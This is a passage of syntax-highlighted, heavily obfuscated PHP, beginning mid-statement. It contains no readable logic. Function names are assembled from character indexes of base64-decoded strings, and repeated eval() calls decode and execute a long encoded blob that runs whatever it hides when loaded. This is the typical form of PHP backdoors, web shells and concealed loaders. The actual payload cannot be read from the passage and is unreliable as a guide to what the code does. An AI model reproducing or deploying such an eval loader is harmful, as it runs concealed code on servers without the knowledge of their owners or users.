class="hljs-number">29</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">26</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">30</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">32</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">35</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">26</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">30</span>];<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$xlJGRj</span>(<span class="hljs-string">&quot;JG1FSUtJdD0iTmdWcWpURVdJQUZmYnl6UVVzWVNhY0hrTVpKdlJoUHhMbkJpT0N0cFhlb0dsS0RkbXJ1d2haWGFBU0JuREt6a2VXUmRDb2djcklIdU1FdlVxWU5MZmpiVkp3cEdsUHhtdFRRRnN5aU9OUTlPckhLWk5SND0iO2V2YWwoJz8+Jy4keGxKR1JqKCROdVFyblcoJFlZSUhsWCgkbUVJS0l0LCRhQUtmU0oqMiksJFlZSUhsWCgkbUVJS0l0LCRhQUtmU0osJGFBS2ZTSiksJFlZSUhsWCgkbUVJS0l0LDAsJGFBS2ZTSikpKSk7&quot;</span>));<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;mqLdGQ1209&#x27;</span>,tzbDEw1209);<span class="hljs-variable">$rXlpZd</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqQmV4QWFuT0ZvbU1Ea2RiV0NmVXF1emh5RUdMTlR3S1BzUmxwWFpyVkh0all2U0pjUWdpSQ==&quot;</span>);<span class="hljs-variable">$NxJrjR</span>=<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">6</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">33</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">30</span>];<span class="hljs-variable">$jIEQJn</span>=<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">33</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">24</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">24</span>];<span class="hljs-variable">$fNiCxT</span>=<span class="hljs-variable">$jIEQJn</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">18</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$jIEQJn</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$jIEQJn</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">24</span>];<span class="hljs-variable">$vGTrfG</span>=<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">7</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">13</span>];<span class="hljs-variable">$NxJrjR</span>.=<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">22</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">36</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">29</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">26</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">30</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">32</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">35</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">26</span>].<span class="hljs-variable">$rXlpZd</span>[<span class="hljs-number">30</span>];<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$leuBaN</span>=\&quot;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